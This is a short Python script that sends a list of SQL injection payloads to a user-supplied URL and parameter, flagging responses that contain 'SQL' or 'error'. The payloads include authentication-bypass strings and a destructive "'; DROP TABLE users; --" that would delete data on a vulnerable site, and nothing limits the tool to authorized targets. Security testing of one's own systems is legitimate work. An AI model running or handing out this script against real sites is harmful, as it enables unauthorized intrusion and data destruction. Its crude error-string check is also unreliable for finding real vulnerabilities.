import requests

# SQL Injection payloads to test
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "'; DROP TABLE users; --",
]

# Function to test SQL injection
def test_sql_injection(base_url, param_name):
    for payload in payloads:
        # Construct the URL with the payload
        url = f"{base_url}?{param_name}={payload}"
        print(f"Testing URL: {url}")
        
        try:
            # Send the request
            response = requests.get(url)
            
            # Check the response
            if response.status_code == 200:
                if "SQL" in response.text or "error" in response.text.lower():
                    print(f"Possible vulnerability detected with payload: {payload}")
                else:
                    print(f"No vulnerability detected with payload: {payload}")
            else:
                print(f"Non-200 HTTP response for payload: {payload}")
        except Exception as e:
            print(f"Error testing payload {payload}: {e}")

# Main function
if __name__ == "__main__":
    # URL and parameter to test
    target_url = input("Enter the target URL (e.g., http://example.com/page): ")
    param = input("Enter the parameter to test (e.g., id): ")
    
    print("\nStarting SQL Injection tests...\n")
    test_sql_injection(target_url, param)
    print("\nTesting completed.")
